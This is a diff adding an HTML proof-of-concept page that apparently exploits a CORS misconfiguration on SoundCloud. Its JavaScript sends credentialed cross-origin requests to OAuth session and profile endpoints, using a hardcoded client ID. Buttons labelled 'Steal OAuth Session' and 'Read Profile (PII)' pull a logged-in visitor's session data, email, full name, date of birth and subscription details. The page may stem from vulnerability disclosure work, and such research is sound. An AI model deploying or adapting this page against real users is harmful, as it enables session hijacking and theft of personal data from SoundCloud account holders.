@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SoundCloud CORS PoC</title>
+    <style>
+        body { background: #1a1a2e; color: #e0e0e0; font-family: monospace; padding: 20px; }
+        h1 { color: #ff4444; }
+        pre { background: #16213e; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
+        button { background: #ff4444; color: white; border: none; padding: 10px 20px; cursor: pointer; font-size: 16px; border-radius: 5px; margin: 5px; }
+        button:hover { background: #cc0000; }
+        .success { color: #00ff00; }
+        .fail { color: #ff4444; }
+        .info { color: #4488ff; }
+        #log { max-height: 600px; overflow-y: auto; }
+    </style>
+</head>
+<body>
+    <h1>SoundCloud CORS Misconfiguration PoC (V21)</h1>
+    <p>secure.soundcloud.com reflects ANY origin with Access-Control-Allow-Credentials: true</p>
+    <p><b>You must be logged into SoundCloud in this browser for this to work.</b></p>
+    <hr>
+    <button onclick="testCORS()">1. Test CORS Headers</button>
+    <button onclick="stealSession()">2. Steal OAuth Session</button>
+    <button onclick="stealProfile()">3. Read Profile (PII)</button>
+    <button onclick="clearLog()">Clear</button>
+    <hr>
+    <h3>Results:</h3>
+    <pre id="log"></pre>
+
+    <script>
+        const CLIENT_ID = "khI8ciOiYPX6UVGInQY5zA0zvTkfzuuC";
+
+        function log(msg, cls) {
+            const el = document.getElementById("log");
+            const line = document.createElement("div");
+            line.className = cls || "";
+            line.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;
+            el.appendChild(line);
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function clearLog() { document.getElementById("log").innerHTML = ""; }
+
+        async function testCORS() {
+            log("=== CORS Header Test ===", "info");
+            log("Our origin: " + window.location.origin, "info");
+
+            var endpoints = [
+                "https://secure.soundcloud.com/oauth/token",
+                "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID,
+                "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID
+            ];
+
+            for (var i = 0; i < endpoints.length; i++) {
+                var url = endpoints[i];
+                log("Testing: " + url.split("?")[0], "info");
+                try {
+                    var resp = await fetch(url, { credentials: "include" });
+                    var acao = resp.headers.get("access-control-allow-origin");
+                    var acac = resp.headers.get("access-control-allow-credentials");
+                    log("  Status: " + resp.status, "info");
+                    log("  ACAO: " + acao, acao ? "success" : "fail");
+                    log("  ACAC: " + acac, acac === "true" ? "success" : "info");
+                    if (acao === window.location.origin) {
+                        log("  VULNERABLE - Origin reflected!", "success");
+                    }
+                } catch(e) {
+                    log("  Blocked by browser: " + e.message, "fail");
+                }
+            }
+        }
+
+        async function stealSession() {
+            log("=== Stealing OAuth Session ===", "info");
+
+            try {
+                var resp = await fetch(
+                    "https://api-auth.soundcloud.com/oauth/session?client_id=" + CLIENT_ID,
+                    { credentials: "include" }
+                );
+                log("Status: " + resp.status, "info");
+
+                if (resp.ok) {
+                    var data = await resp.json();
+                    log("SESSION STOLEN!", "success");
+                    log(JSON.stringify(data, null, 2), "success");
+                } else {
+                    var text = await resp.text();
+                    log("Response: " + text.substring(0, 500), "info");
+                }
+            } catch(e) {
+                log("Error: " + e.message, "fail");
+            }
+        }
+
+        async function stealProfile() {
+            log("=== Reading Victim Profile ===", "info");
+
+            try {
+                var resp = await fetch(
+                    "https://api-v2.soundcloud.com/me?client_id=" + CLIENT_ID,
+                    { credentials: "include" }
+                );
+                log("Status: " + resp.status, "info");
+
+                if (resp.ok) {
+                    var data = await resp.json();
+                    log("PROFILE DATA STOLEN!", "success");
+                    log("  Username: " + data.username, "success");
+                    log("  Email: " + data.primary_email, "success");
+                    log("  User ID: " + data.id, "success");
+                    log("  Full Name: " + data.full_name, "success");
+                    log("  DOB: " + JSON.stringify(data.date_of_birth), "success");
+                    log("  Country: " + data.country_code, "success");
+                    log("  Verified: " + data.verified, "success");
+                    log("  Plan: " + (data.consumer_subscription || {}).product, "success");
+                    log("  OAuth Token from cookie: check browser cookies", "info");
+                    log("Full response:", "info");
+                    log(JSON.stringify(data, null, 2).substring(0, 2000), "success");
+                } else {
+                    var text = await resp.text();
+                    log("Not logged in or blocked: " + text.substring(0, 200), "fail");
+                }
+            } catch(e) {
+                log("Error: " + e.message, "fail");
+                log("If CORS blocks this, the api-v2 only reflects *.soundcloud.com origins", "info");
+                log("The secure.soundcloud.com endpoint reflects ANY origin", "info");
+            }
+        }
+    </script>
+</body>
+</html>
